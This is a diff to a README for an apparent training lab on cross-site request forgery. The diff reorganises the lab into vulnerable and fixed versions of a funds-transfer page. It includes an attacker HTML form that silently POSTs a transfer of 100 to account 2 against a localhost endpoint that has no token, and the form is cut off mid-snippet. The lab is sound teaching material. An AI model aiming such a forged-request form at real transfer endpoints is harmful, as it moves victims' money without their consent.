@@ -4,14 +4,15 @@
 
 ## Files
 
-- Form: `/lab4-csrf/transfer.php`
-- Action (no token): `/lab4-csrf/transfer_action.php`
+- Form: `/lab4-csrf/vulnerable/transfer.php`
+- Action (no token): `/lab4-csrf/vulnerable/transfer_action.php`
+- Secure: `/lab4-csrf/fixed/transfer_secure.php`, `transfer_action_secure.php`
 
 ## Attack Page
 
 ```html
 <!-- Attacker page (save as attacker.html and open while logged in) -->
-<form action="http://localhost/A012025-Broken-Access-Control/lab4-csrf/transfer_action.php"
+<form action="http://localhost/A012025-Broken-Access-Control/lab4-csrf/vulnerable/transfer_action.php"
       method="POST">
   <input name="to" value="2">
   <input name="amount" value="100">
